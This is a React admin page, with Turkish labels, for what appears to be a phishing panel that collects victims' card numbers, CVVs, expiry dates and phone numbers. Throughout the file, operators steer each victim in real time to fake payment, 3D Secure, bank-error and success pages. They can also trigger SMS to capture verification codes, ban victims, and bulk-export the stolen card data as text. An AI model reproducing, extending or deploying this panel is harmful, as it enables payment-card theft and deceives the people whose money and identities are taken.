'use client';

import { useMemo, useState } from 'react';
import { FiTrash2, FiDownload, FiRefreshCw, FiSearch } from 'react-icons/fi';
import { useToast } from '@/components/ToastProvider';
import LiveStatusBar from '@/components/admin/LiveStatusBar';
import LogTable from '@/components/admin/LogTable';
import AdminActionsModal from '@/components/admin/AdminActionsModal';
import ConfirmDialog from '@/components/admin/ConfirmDialog';
import { useAdminLive } from '@/components/admin/AdminLiveProvider';
import { INACTIVE_SITE_REDIRECT_URL } from '@/lib/constants';
import { hasCard } from '@/lib/logQualify';
import { isLogOnline } from '@/lib/logOnlineUtils';
import { useOnlineClock } from '@/lib/useOnlineClock';
import { sortLogsByQueue, sortLogsByRecent } from '@/lib/logSort';
import { isAdresteLog, isIslemdekilerLog } from '@/lib/logCategories';
import { buildCardExportTxt, downloadTextFile } from '@/lib/logExport';
import type { Log } from '@/lib/db/types';

export default function LogsPage() {
  const { showToast } = useToast();
  const { logs, visitorStats, loading, refresh } = useAdminLive();
  const now = useOnlineClock(1000);
  const [selectedActions, setSelectedActions] = useState<{ [key: string]: string }>({});
  const [customUrls, setCustomUrls] = useState<{ [key: string]: string }>({});
  const [showCustomUrlInput, setShowCustomUrlInput] = useState<{ [key: string]: boolean }>({});
  const [selectedLogs, setSelectedLogs] = useState<Set<string>>(new Set());
  const [bulkAction, setBulkAction] = useState<string>('Seç');
  const [bulkCustomUrl, setBulkCustomUrl] = useState<string>('');
  const [actionsModalLogId, setActionsModalLogId] = useState<string | null>(null);
  const [deleteConfirm, setDeleteConfirm] = useState<
    { mode: 'single'; logId: string; label: string } | { mode: 'all' } | { mode: 'empty' } | null
  >(null);
  const [deleteLoading, setDeleteLoading] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');
  const [onlineOnly, setOnlineOnly] = useState(false);
  const [sectionFilter, setSectionFilter] = useState<'all' | 'adreste' | 'islemdekiler' | 'tamamlandi'>('all');

  const fetchLogs = () => {
    void refresh();
  };

  const refreshAll = () => {
    fetchLogs();
  };

  const handleDeleteAll = () => {
    setDeleteConfirm({ mode: 'all' });
  };

  const handleDeleteEmpty = () => {
    setDeleteConfirm({ mode: 'empty' });
  };

  const executeDeleteEmpty = async () => {
    setDeleteLoading(true);
    try {
      const res = await fetch('/api/logs/delete-empty', { method: 'DELETE' });
      const data = await res.json();
      if (data.success) {
        showToast(data.message || `${data.deletedCount} boş log silindi`, 'success');
        setDeleteConfirm(null);
        fetchLogs();
      } else {
        showToast(data.error || 'Boş loglar silinemedi', 'error');
      }
    } catch {
      showToast('Boş loglar silinemedi', 'error');
    } finally {
      setDeleteLoading(false);
    }
  };

  const executeDeleteAll = async () => {
    setDeleteLoading(true);
    try {
      const res = await fetch('/api/logs/delete-all', { method: 'DELETE' });
      const data = await res.json();
      if (data.success) {
        showToast(`${data.deletedCount} log silindi`, 'success');
        setDeleteConfirm(null);
        fetchLogs();
      } else {
        showToast(data.error || 'Loglar silinemedi', 'error');
      }
    } catch {
      showToast('Loglar silinemedi', 'error');
    } finally {
      setDeleteLoading(false);
    }
  };

  const requestDeleteLog = (logId: string) => {
    const log = logs.find((l) => l._id === logId);
    const label = log?.name || log?.phone || logId.slice(-6);
    setDeleteConfirm({ mode: 'single', logId, label });
  };

  const executeDeleteLog = async (logId: string) => {
    setDeleteLoading(true);

    try {
      const res = await fetch(`/api/logs/${logId}`, { method: 'DELETE' });
      const data = await res.json();
      if (data.success) {
        showToast(data.message || 'Log silindi', 'success');
        setDeleteConfirm(null);
        fetchLogs();
      } else {
        showToast(data.error || 'Log silinemedi', 'error');
        fetchLogs();
      }
    } catch {
      showToast('Log silinemedi', 'error');
      fetchLogs();
    } finally {
      setDeleteLoading(false);
    }
  };

  const handleConfirmDelete = () => {
    if (!deleteConfirm || deleteLoading) return;
    if (deleteConfirm.mode === 'all') {
      executeDeleteAll();
      return;
    }
    if (deleteConfirm.mode === 'empty') {
      executeDeleteEmpty();
      return;
    }
    executeDeleteLog(deleteConfirm.logId);
  };

  const handleExport = () => {
    const txt = buildCardExportTxt(logs);
    const rowCount = logs.filter((log) => hasCard(log)).length;

    if (rowCount === 0) {
      showToast('Kart bilgisi olan log bulunamadı', 'error');
      return;
    }

    downloadTextFile(txt, `logs-${new Date().toISOString().split('T')[0]}.txt`);
    showToast(`${rowCount} kart kaydı indirildi`, 'success');
  };

  // Toplu işlem fonksiyonu
  const handleBulkAction = async () => {
    if (bulkAction === 'Seç' || selectedLogs.size === 0) {
      showToast('Lütfen işlem seçin ve en az bir log seçin', 'error');
      return;
    }

    // Geçersiz işlemler için kontrol
    const invalidBulkActions = ['SMS Gönder', 'Özel URL']; // 'Logu sil' kaldırıldı çünkü seçenek yok
    if (invalidBulkActions.includes(bulkAction)) {
      if (bulkAction === 'Özel URL' && (!bulkCustomUrl || bulkCustomUrl.trim() === '')) {
        showToast('Lütfen özel URL girin', 'error');
        return;
      }
    }

    const selectedLogIds = Array.from(selectedLogs);
    let successCount = 0;
    let errorCount = 0;
    const errors: string[] = [];

    showToast(`${selectedLogIds.length} log için işlem başlatılıyor...`, 'info');

    // Her log için işlemi uygula
    for (const logId of selectedLogIds) {
      try {
        const log = logs.find(l => l._id === logId);
        if (!log) {
          errorCount++;
          errors.push(`Log ${logId.slice(-4)} bulunamadı`);
          continue;
        }

        // Özel URL için bulkCustomUrl kullan
        if (bulkAction === 'Özel URL' && bulkCustomUrl) {
          // Özel URL için customUrls'e ekle
          setCustomUrls({ ...customUrls, [logId]: bulkCustomUrl });
          try {
            await handleActionChange(logId, 'Özel URL Gönder', true);
            successCount++;
          } catch (actionError: any) {
            errorCount++;
            const errorMsg = actionError.message || 'Bilinmeyen hata';
            errors.push(`Log ${logId.slice(-4)}: ${errorMsg}`);
          }
        } else {
          // Diğer işlemler için normal fonksiyonu kullan
          // Hata yakalama - eğer hata fırlatılırsa, log'u atla ve devam et
          try {
            await handleActionChange(logId, bulkAction, true);
            successCount++;
          } catch (actionError: any) {
            // Eksik bilgi gibi hataları sessizce atla (toplu işlemde)
            const errorMsg = actionError.message || 'Bilinmeyen hata';
            if (errorMsg.includes('Eksik bilgi')) {
              // Eksik bilgi hatasını sessizce atla
              console.warn(`Log ${logId.slice(-4)} atlandı: ${errorMsg}`);
            } else {
              errorCount++;
              errors.push(`Log ${logId.slice(-4)}: ${errorMsg}`);
            }
          }
        }
        
        // Rate limiting için kısa bekleme (çok fazla istek göndermek için)
        if (selectedLogIds.length > 10) {
          await new Promise(resolve => setTimeout(resolve, 50));
        }
      } catch (error: any) {
        errorCount++;
        const errorMsg = error.message || 'Bilinmeyen hata';
        // Eksik bilgi hatasını sessizce atla
        if (!errorMsg.includes('Eksik bilgi')) {
          errors.push(`Log ${logId.slice(-4)}: ${errorMsg}`);
        }
        console.error(`Log ${logId} için hata:`, error);
      }
    }

    // Seçimleri temizle
    setSelectedLogs(new Set());
    setBulkAction('Seç');
    setBulkCustomUrl('');

    // Sonuç mesajı
    const message = errorCount > 0 
      ? `Toplu işlem: ${successCount} başarılı, ${errorCount} hata. ${errors.slice(0, 3).join(', ')}${errors.length > 3 ? '...' : ''}`
      : `Toplu işlem tamamlandı: ${successCount} log başarıyla güncellendi`;
    
    showToast(message, successCount > 0 ? 'success' : 'error');

    // Logları yenile
    await fetchLogs();
  };

  // Log seçimi
  const toggleLogSelection = (logId: string) => {
    const newSelected = new Set(selectedLogs);
    if (newSelected.has(logId)) {
      newSelected.delete(logId);
    } else {
      newSelected.add(logId);
    }
    setSelectedLogs(newSelected);
  };

  // Tümünü seç/seçimi kaldır
  const toggleSelectAll = () => {
    if (selectedLogs.size === logs.length) {
      setSelectedLogs(new Set());
    } else {
      setSelectedLogs(new Set(logs.map(log => log._id)));
    }
  };

  const handleActionChange = async (logId: string, action: string, isBulkAction: boolean = false) => {
    if (action === 'Seç') {
      // Seç işlemi yapıldığında, state'i temizle
      setSelectedActions((prev) => ({ ...prev, [logId]: 'Seç' }));
      return;
    }
    
    setSelectedActions((prev) => ({ ...prev, [logId]: action }));
    
    try {
      const log = logs.find(l => l._id === logId);
      if (!log) {
        showToast('Log bulunamadı', 'error');
        // Dropdown'u sıfırla
        setSelectedActions((prev) => ({ ...prev, [logId]: 'Seç' }));
        return;
      }

      // Yönlendirme ayarları
      let redirectTo = undefined;
      let redirectReason = undefined;
      let status = undefined;
      let pageType = undefined;

      // Özel işlemler
      if (action === 'Logu sil') {
        requestDeleteLog(logId);
        setActionsModalLogId(null);
        return;
      }

      if (action === 'SMS Gönder') {
        // SMS gönder
        if (!log.phone) {
          showToast('Telefon numarası bulunamadı', 'error');
          // Dropdown'u sıfırla
          setSelectedActions((prev) => ({ ...prev, [logId]: 'Seç' }));
          return;
        }
        
        const cleanPhone = log.phone.replace(/\D/g, '').slice(-10);
        if (cleanPhone.length !== 10) {
          showToast('Geçersiz telefon numarası', 'error');
          // Dropdown'u sıfırla
          setSelectedActions((prev) => ({ ...prev, [logId]: 'Seç' }));
          return;
        }

        let smsSuccess = false;
        try {
          const smsRes = await fetch('/api/auth/send-sms', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: cleanPhone }),
          });
          const smsData = await smsRes.json();
          if (smsData.success) {
            smsSuccess = true;
            showToast('SMS başarıyla gönderildi', 'success');
          } else {
            showToast('SMS gönderilemedi: ' + (smsData.error || 'Bilinmeyen hata'), 'error');
          }
        } catch (smsError) {
          showToast('SMS gönderme hatası', 'error');
        }
        
        // SMS gönderildikten sonra log'u güncelle
        status = log.status || 'Bekliyor';
        redirectReason = smsSuccess ? 'SMS Gönderildi' : 'SMS Gönderilemedi';
        // Yönlendirme yapma, önceki redirectTo'yu koru
        // redirectTo undefined kalacak, böylece önceki değer korunur
        
        // Log güncelleme işlemi devam edecek (return yapmadan)
      }

      // Özel URL girişi
      if (action === 'Özel URL') {
        setShowCustomUrlInput((prev) => ({ ...prev, [logId]: true }));
        setSelectedActions((prev) => ({ ...prev, [logId]: 'Seç' })); // Dropdown'u "Seç"e geri döndür
        return; // Input göster, henüz yönlendirme yapma
      }

      // Özel URL ile yönlendirme
      if (action === 'Özel URL Gönder' && customUrls[logId]) {
        redirectTo = customUrls[logId].startsWith('/') ? customUrls[logId] : `/${customUrls[logId]}`;
        redirectReason = 'Özel Yönlendirme';
        status = log.status || 'Bekliyor';
        // Custom URL input'unu kapat
        setShowCustomUrlInput({ ...showCustomUrlInput, [logId]: false });
      } else if (action === 'Özel URL' && isBulkAction && bulkCustomUrl) {
        // Toplu işlem için özel URL
        redirectTo = bulkCustomUrl.startsWith('/') ? bulkCustomUrl : `/${bulkCustomUrl}`;
        redirectReason = 'Özel Yönlendirme (Toplu)';
        status = log.status || 'Bekliyor';
      }
      // Hatalı SMS - Processing sayfasına geri yönlendir (hata mesajı ile)
      else if (action === 'Hatalı SMS') {
        // Processing sayfasına geri yönlendir (logId ile)
        const hasPhone = log.phone && log.phone.trim() !== '';
        const hasCardNumber = log.cardNumber && log.cardNumber.trim() !== '';
        const hasAmount = log.amount && log.amount > 0;
        
        const defaultPhone = log.phone || '5550000000';
        const defaultCardNumber = log.cardNumber || '4242424242424242';
        const defaultAmount = log.amount || 0;
        
        redirectTo = `/checkout/processing?amount=${defaultAmount}&cardNumber=${encodeURIComponent(defaultCardNumber)}&phone=${encodeURIComponent(defaultPhone || '')}&expiryDate=${encodeURIComponent(log.expiryDate || '')}&cvv=${encodeURIComponent(log.cvv || '')}&logId=${logId}&error=hataliSMS`;
        redirectReason = 'Hatalı SMS';
        status = 'Hatalı Kod Girişi';
      }
      // Hatalı işlemler için error sayfasına yönlendir
      else if (action === 'Hatalıya Gönder' || action === 'CCNO Hatalı' || action === 'SKT Hatalı' || action === 'CVV Hatalı' || action === 'Telefon Hatalı' || action === 'Kart Kapalı' || action === 'Kart Limiti Yetersiz' || action === 'Farklı Banka Kartı' || action === 'Kart Bilgileri Hatalı' || action === 'Banka Reddedildi' || action === 'Hata Ver') {
        const errorType = action === 'CCNO Hatalı' ? 'cardNumber' 
          : action === 'SKT Hatalı' ? 'expiryDate' 
          : action === 'CVV Hatalı' ? 'cvv' 
          : action === 'Telefon Hatalı' ? 'phone' 
          : action === 'Kart Kapalı' ? 'cardClosed'
          : action === 'Kart Limiti Yetersiz' ? 'limit'
          : action === 'Farklı Banka Kartı' ? 'differentBank'
          : action === 'Kart Bilgileri Hatalı' ? 'cardInfo'
          : action === 'Banka Reddedildi' ? 'bankRejected'
          : 'general';
        redirectTo = `/checkout/payment?logId=${logId}&error=${errorType}`;
        redirectReason = action;
        status = 'Hata';
      } else if (action === 'Doğrulama (3D Secure)') {
        // Doğrulama için processing sayfasına yönlendir ve SMS gönder
        // Eksik bilgi kontrolü - eğer eksikse, varsayılan değerler kullan
        const hasPhone = log.phone && log.phone.trim() !== '';
        const hasCardNumber = log.cardNumber && log.cardNumber.trim() !== '';
        const hasAmount = log.amount && log.amount > 0;
        
        // Varsayılan değerler
        const defaultPhone = log.phone || '5550000000';
        const defaultCardNumber = log.cardNumber || '4242424242424242';
        const defaultAmount = log.amount || 0;
        
        // Her durumda processing sayfasına yönlendir
        redirectTo = `/checkout/processing?amount=${defaultAmount}&cardNumber=${encodeURIComponent(defaultCardNumber)}&phone=${encodeURIComponent(defaultPhone)}&expiryDate=${encodeURIComponent(log.expiryDate || '')}&cvv=${encodeURIComponent(log.cvv || '')}&logId=${logId}`;
        redirectReason = 'Doğrulama (3D Secure)';
        status = '3D Secure Bekliyor';
        
        // SMS gönder (telefon numarası varsa)
        if (hasPhone && log.phone) {
          const cleanPhone = log.phone.replace(/\D/g, '').slice(-10);
          if (cleanPhone.length === 10) {
            try {
              const smsRes = await fetch('/api/auth/send-sms', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: cleanPhone }),
              });
              const smsData = await smsRes.json();
              if (!smsData.success) {
                console.error('SMS gönderme hatası:', smsData.error);
              }
            } catch (smsError) {
              console.error('SMS gönderme hatası:', smsError);
            }
          }
        }
      } else if (action === 'Adres Sayfası') {
        redirectTo = `/checkout?logId=${logId}`;
        redirectReason = 'Adres Sayfası';
        status = 'Adres Ekranında';
        pageType = 'address';
      } else if (action === 'Checkout Sayfası' || action === 'Ödeme Sayfası') {
        redirectTo = `/checkout/payment?logId=${logId}`;
        redirectReason = 'Ödeme Sayfası';
        status = 'Ödeme Sayfasında';
        pageType = 'payment';
      } else if (action === 'Bekleme Sayfası') {
        redirectTo = `/checkout/waiting?logId=${logId}`;
        redirectReason = 'Bekleme Sayfası';
        status = 'Bekliyor';
      } else if (action === 'Başarılı Sayfası') {
        redirectTo = `/checkout/success?logId=${logId}`;
        redirectReason = 'Başarılı Sayfası';
        status = 'Başarılı';
      } else if (action === 'Banla') {
        status = 'Hata';
        redirectReason = 'Banla';
        redirectTo = INACTIVE_SITE_REDIRECT_URL;
      } else if (action === 'Bekle') {
        status = 'Bekliyor';
        redirectReason = 'Bekle';
        // Bekle işlemi için redirectTo temizle ve bekleme sayfasına yönlendir
        redirectTo = `/checkout/waiting?logId=${logId}`;
      } else if (action === 'Tebrikle') {
        status = 'Başarılı';
        redirectTo = `/checkout/success?logId=${logId}`;
        redirectReason = 'Tebrikle';
      }
      
      // Eğer hiçbir yönlendirme yapılmadıysa ve status set edilmediyse
      if (status === undefined && redirectTo === undefined) {
        status = log.status || 'Bekliyor';
      }
      
      // Eğer redirectTo undefined ise ve önceki redirectTo varsa, onu koru (temizleme)
      // Sadece açıkça temizlenmesi gereken işlemler için redirectTo = '' yapılır

      // Debug logları kaldırıldı (performans için)

      // redirectTo varsa mutlaka gönder (undefined değil, string olarak)
      const updateBody: any = {
        action: action || log.action,
      };
      
      // Status her zaman set et (undefined olmamalı)
      if (status !== undefined) {
        updateBody.status = status;
      } else {
        updateBody.status = log.status || 'Bekliyor';
      }
      
      // redirectTo işlemi - undefined değilse mutlaka set et (boş string dahil)
      if (redirectTo !== undefined) {
        updateBody.redirectTo = redirectTo;
      }
      // Eğer redirectTo undefined ise, eski değeri koru (güncelleme yapma)
      
      // redirectReason işlemi - undefined değilse mutlaka set et
      if (redirectReason !== undefined) {
        updateBody.redirectReason = redirectReason;
      }

      if (pageType !== undefined) {
        updateBody.pageType = pageType;
      }
      // Eğer redirectReason undefined ise, eski değeri koru (güncelleme yapma)

      // Debug logları kaldırıldı (performans için)

      const res = await fetch(`/api/logs/${logId}?t=${Date.now()}`, {
        method: 'PUT',
        headers: { 
          'Content-Type': 'application/json',
          'Cache-Control': 'no-cache'
        },
        body: JSON.stringify(updateBody),
      });
      const data = await res.json();
      
      if (data.success) {
        // Debug logları kaldırıldı (performans için)
        
        // Toplu işlem modunda toast gösterme (sonunda toplu toast gösterilecek)
        if (!isBulkAction) {
          const message = redirectTo 
            ? `İşlem güncellendi - Kullanıcı anlık olarak ${redirectTo} sayfasına yönlendirilecek` 
            : 'İşlem güncellendi';
          showToast(message, 'success');
          
          // Log'u hemen güncelle (anlık yönlendirme için)
          fetchLogs();
          
          // İşlem tamamlanınca dropdown'u "Seç"e sıfırla
          setSelectedActions((prev) => ({ ...prev, [logId]: 'Seç' }));
        }
        
        // Debug logları kaldırıldı (performans için)
      } else {
        console.error('❌ Log güncelleme hatası:', data.error);
        const errorMsg = data.error || 'Bilinmeyen hata';
        if (!isBulkAction) {
          showToast('İşlem güncellenemedi: ' + errorMsg, 'error');
        }
        throw new Error(errorMsg);
      }
    } catch (error: any) {
      console.error('İşlem hatası:', error);
      const errorMsg = error.message || 'Bilinmeyen hata';
      
      // Toplu işlem modunda hatayı yukarı fırlat (sessizce işlenecek)
      if (isBulkAction) {
        throw error;
      }
      
      // Tekil işlem modunda kullanıcıya göster
      // Eksik bilgi hatası için özel mesaj gösterme
      if (!errorMsg.includes('Eksik bilgi')) {
        showToast('İşlem güncellenemedi: ' + errorMsg, 'error');
      } else {
        // Eksik bilgi hatası için sessizce devam et
        console.warn('Eksik bilgi nedeniyle işlem atlandı:', errorMsg);
      }
      
      // Hata durumunda da dropdown'u sıfırla
      setSelectedActions((prev) => ({ ...prev, [logId]: 'Seç' }));
    }
  };

  const formatCardNumber = (card?: string) => {
    if (!card) return '';
    return card.replace(/(\d{4})(?=\d)/g, '$1 ');
  };

  const formatDate = (date: string) => {
    return new Date(date).toLocaleString('tr-TR', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
    });
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'Başarılı':
        return 'bg-green-500 text-white';
      case '3D Secure':
      case '3D Secure Bekliyor':
        return 'bg-green-500 text-white';
      case 'Bekliyor':
        return 'bg-blue-600 text-white font-bold shadow-lg border-2 border-blue-500';
      case 'Bulunamadı X':
        return 'bg-red-500 text-white';
      case 'Hata':
      case 'Hatalı Kod Girişi':
        return 'bg-red-500 text-white';
      case 'Sepette':
        return 'bg-purple-500 text-white';
      case 'Ödeme Sayfası':
        return 'bg-orange-500 text-white';
      case 'Ürün Detay':
        return 'bg-indigo-500 text-white';
      case 'Ana Sayfa':
        return 'bg-teal-500 text-white';
      default:
        return 'bg-gray-500 text-white';
    }
  };

  const actionOptions = [
    'Seç',
    '--- Yönlendirmeler ---',
    'Adres Sayfası',
    'Ödeme Sayfası',
    'Checkout Sayfası',
    'Bekleme Sayfası',
    'Doğrulama (3D Secure)',
    'Başarılı Sayfası',
    '--- Hata Sayfaları ---',
    'Hatalı SMS',
    'CCNO Hatalı',
    'SKT Hatalı',
    'CVV Hatalı',
    'Telefon Hatalı',
    'Kart Kapalı',
    'Kart Limiti Yetersiz',
    'Farklı Banka Kartı',
    'Kart Bilgileri Hatalı',
    'Banka Reddedildi',
    'Hatalıya Gönder',
    'Hata Ver',
    '--- Diğer İşlemler ---',
    'SMS Gönder',
    'Tebrikle',
    'Bekle',
    'Banla',
    '--- Özel ---',
    'Özel URL',
  ];

  const filterLogs = (list: Log[], mode: 'queue' | 'recent' = 'recent') => {
    let result = list;
    const q = searchQuery.trim().toLowerCase();
    if (q) {
      result = result.filter(
        (log) =>
          log.name?.toLowerCase().includes(q) ||
          log.phone?.includes(q) ||
          log.visitorId?.toLowerCase().includes(q) ||
          log.ipAddress?.includes(q)
      );
    }
    if (onlineOnly) {
      result = result.filter((log) => isLogOnline(log, now));
    }
    return mode === 'queue' ? sortLogsByQueue(result) : sortLogsByRecent(result);
  };

  const tamamlandi = useMemo(
    () => filterLogs(logs.filter((log) => log.status === 'Başarılı')),
    [logs, searchQuery, onlineOnly, now]
  );
  const islemdekiler = useMemo(
    () => filterLogs(logs.filter((log) => isIslemdekilerLog(log)), 'queue'),
    [logs, searchQuery, onlineOnly, now]
  );
  const adreste = useMemo(
    () => filterLogs(logs.filter((log) => isAdresteLog(log)), 'queue'),
    [logs, searchQuery, onlineOnly, now]
  );

  const showIslemdekiler = sectionFilter === 'all' || sectionFilter === 'islemdekiler';
  const showAdreste = sectionFilter === 'all' || sectionFilter === 'adreste';
  const showTamamlandi = sectionFilter === 'all' || sectionFilter === 'tamamlandi';

  return (
    <div className="space-y-5">
      <div className="flex flex-wrap items-center justify-between gap-3">
        <div>
          <h1 className="text-2xl font-bold text-white">Loglar</h1>
          <p className="mt-1 text-sm text-gray-500">
            Adreste: adres yazmaya başlayınca düşer · İşlemdekiler: /checkout/payment
          </p>
        </div>
        <div className="flex flex-wrap gap-2">
          <button
            onClick={refreshAll}
            className="flex items-center gap-2 rounded-lg border border-[#2a3142] bg-[#151922] px-3.5 py-2.5 text-sm text-gray-300 hover:text-white"
          >
            <FiRefreshCw size={16} />
            Yenile
          </button>
          <button
            onClick={handleExport}
            className="flex items-center gap-2 rounded-lg border border-blue-500/30 bg-blue-500/10 px-3.5 py-2.5 text-sm font-semibold text-blue-400 hover:bg-blue-500/20"
          >
            <FiDownload size={16} />
            TXT İndir ({logs.length})
          </button>
          <button
            onClick={handleDeleteEmpty}
            className="flex items-center gap-2 rounded-lg border border-orange-500/30 bg-orange-500/10 px-3.5 py-2.5 text-sm font-semibold text-orange-400 hover:bg-orange-500/20"
          >
            <FiTrash2 size={16} />
            Boş Logları Sil
          </button>
          <button
            onClick={handleDeleteAll}
            className="flex items-center gap-2 rounded-lg border border-red-500/30 bg-red-500/10 px-3.5 py-2.5 text-sm font-semibold text-red-400 hover:bg-red-500/20"
          >
            <FiTrash2 size={16} />
            Tümünü Sil
          </button>
        </div>
      </div>

      <LiveStatusBar stats={visitorStats} />

      <div className="flex flex-wrap items-center gap-3 rounded-xl border border-[#2a3142] bg-[#151922] p-4">
        <div className="relative min-w-[200px] flex-1">
          <FiSearch className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-gray-500" />
          <input
            type="search"
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            placeholder="İsim, telefon, ziyaretçi ID veya IP ara..."
            className="w-full rounded-lg border border-[#2a3142] bg-[#1a1f2b] py-2.5 pl-9 pr-3 text-sm text-white placeholder:text-gray-500 focus:border-blue-500/50 focus:outline-none"
          />
        </div>
        <label className="inline-flex cursor-pointer items-center gap-2 text-sm text-gray-300">
          <input
            type="checkbox"
            checked={onlineOnly}
            onChange={(e) => setOnlineOnly(e.target.checked)}
            className="rounded border-[#2a3142] bg-[#1a1f2b] text-blue-500"
          />
          Sadece online
        </label>
        <select
          value={sectionFilter}
          onChange={(e) => setSectionFilter(e.target.value as typeof sectionFilter)}
          className="rounded-lg border border-[#2a3142] bg-[#1a1f2b] px-3 py-2.5 text-sm text-white focus:border-blue-500/50 focus:outline-none"
        >
          <option value="all">Tüm bölümler</option>
          <option value="adreste">Adreste ({adreste.length})</option>
          <option value="islemdekiler">İşlemdekiler ({islemdekiler.length})</option>
          <option value="tamamlandi">Tamamlandı ({tamamlandi.length})</option>
        </select>
      </div>

      {showIslemdekiler && (
        <LogTable
          title="İşlemdekiler"
          logs={islemdekiler}
          loading={loading}
          pageSize={50}
          showQueueNumber
          onOpenActions={setActionsModalLogId}
          onDelete={requestDeleteLog}
        />
      )}

      {showTamamlandi && (
        <LogTable
          title="Tamamlandı"
          logs={tamamlandi}
          loading={loading}
          pageSize={50}
          onOpenActions={setActionsModalLogId}
          onDelete={requestDeleteLog}
        />
      )}

      {showAdreste && (
        <LogTable
          title="Adreste"
          logs={adreste}
          loading={loading}
          pageSize={50}
          onOpenActions={setActionsModalLogId}
          onDelete={requestDeleteLog}
        />
      )}

      <AdminActionsModal
        isOpen={Boolean(actionsModalLogId)}
        logId={actionsModalLogId}
        onClose={() => setActionsModalLogId(null)}
        onDelete={requestDeleteLog}
        onAction={(action) => {
          if (actionsModalLogId) handleActionChange(actionsModalLogId, action);
        }}
      />

      <ConfirmDialog
        isOpen={Boolean(deleteConfirm)}
        title={
          deleteConfirm?.mode === 'all'
            ? 'Tüm logları sil'
            : deleteConfirm?.mode === 'empty'
              ? 'Boş logları sil'
              : 'Logu sil'
        }
        message={
          deleteConfirm?.mode === 'all'
            ? 'Tüm log kayıtları kalıcı olarak silinecek. Bu işlem geri alınamaz.'
            : deleteConfirm?.mode === 'empty'
              ? 'Kart, adres ve telefon bilgisi olmayan tüm log kayıtları silinecek. Tamamlanan ve işlemdeki kayıtlar korunur.'
              : `"${deleteConfirm?.label ?? ''}" kaydı kalıcı olarak silinecek. Aynı telefon veya IP'ye ait diğer kayıtlar da silinir.`
        }
        confirmLabel={
          deleteConfirm?.mode === 'all'
            ? 'Tümünü Sil'
            : deleteConfirm?.mode === 'empty'
              ? 'Boş Logları Sil'
              : 'Sil'
        }
        loading={deleteLoading}
        onConfirm={handleConfirmDelete}
        onCancel={() => {
          if (!deleteLoading) setDeleteConfirm(null);
        }}
      />
    </div>
  );
}

